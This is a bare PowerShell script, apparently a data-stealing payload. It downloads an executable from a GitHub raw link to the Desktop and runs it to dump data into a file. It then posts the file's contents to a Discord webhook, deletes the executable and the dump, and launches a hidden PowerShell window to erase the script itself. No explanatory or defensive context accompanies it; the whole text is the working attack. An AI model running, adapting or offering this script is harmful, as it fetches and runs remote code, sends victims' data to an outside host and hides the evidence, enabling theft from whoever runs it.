Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/p.exe" -OutFile "$HOME\Desktop\p.exe";
Start-Sleep -Seconds 2;
& $HOME\Desktop\p.exe /stab "$HOME\Desktop\_";
Start-Sleep -Seconds 1;
$webhook = "https://discord.com/api/webhooks/1065364894037319831/D0K_i0IG0TUJ_tV0nCJaVScJYp_";

$payload = @{ content = [IO.File]::ReadAllText("$HOME\Desktop\_") };
Invoke-RestMethod -URI ($webhook + "uCydJ2TZGpPr9xbPOLaC_WYWR-tPBJx2jQqhvZWUE") -Method Post -Body $payload;
Remove-Item -Path "$HOME\Desktop\p.exe";
Remove-Item -Path "$HOME\Desktop\_";
Start PowerShell -windowStyle hidden {"Remove-Item -Path $HOME\Desktop\b.ps1"};
